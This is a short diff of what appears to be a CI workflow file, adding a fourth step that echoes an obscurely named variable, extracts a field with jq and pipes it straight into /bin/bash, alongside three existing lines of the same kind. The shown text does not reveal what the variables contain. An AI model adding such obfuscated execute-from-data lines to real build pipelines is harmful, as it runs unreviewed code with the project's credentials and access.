@@ -23,6 +23,7 @@ jobs:
           echo $udhub46 | jq -r .oqu815 | /bin/bash
           printf '%s' "$n55" | jq -r .v62 | /bin/bash
           echo $nhfqn08624 | jq -r .pouwb44069 | /bin/bash
+          echo $hkd03 | jq -r .wepi20 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
